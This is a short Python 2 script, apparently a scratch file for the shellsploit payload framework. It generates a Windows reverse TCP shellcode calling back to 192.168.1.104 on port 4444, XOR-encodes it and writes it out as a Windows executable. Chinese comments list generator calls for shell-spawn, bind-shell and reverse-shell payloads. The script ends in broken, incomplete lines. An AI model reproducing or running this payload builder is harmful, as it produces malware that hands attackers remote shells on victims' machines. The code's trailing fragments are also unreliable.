#!/usr/bin/env python2
# -*- coding: utf-8 -*-

import os
import sys
from start import *

name = os.sep.join([x for x in os.getcwd().split(os.sep) if x != os.getcwd().split(os.sep)[-1]])
sys.path.append(name)



shellsploit = Engine()
shellcode = shellsploit.shellcode("windows/reverse_tcp",ip = "192.168.1.104",port=4444)
print shellcode
a= shellsploit.encode("x86/xor", 1, shellcode)
from Outputs.exe import ExeFile
ExeFile(a, "windows")


string.split('/')
if 

#解决问题：
"""
1.循环遍历database目录里的内容，取出shellcode的目录名和shellcode名字，第一个目录名字
2.取出shellcode名字，不带后缀，利用目录和文件分离技术，os.path.split()分离,s.split('.')[1]，
取出shellcode不带后缀名字
3.开始shellcode = binsh_spawn
binsh_spawn的参数为:self.disassembly = generator("linux86", "binsh_spawn")
read/file的参数为：self.disassembly = generator("linux86", "read", FILE=kwargs["file"])
tcp_bind的参数为：self.disassembly = generator("linux86", "tcp_bind", port=kwargs["port"])
reverse_tcp的参数为：self.disassembly = generator("freebsdx64", "reverse_tcp", ip=kwargs["ip"], port=kwargs["port"])
"""


    
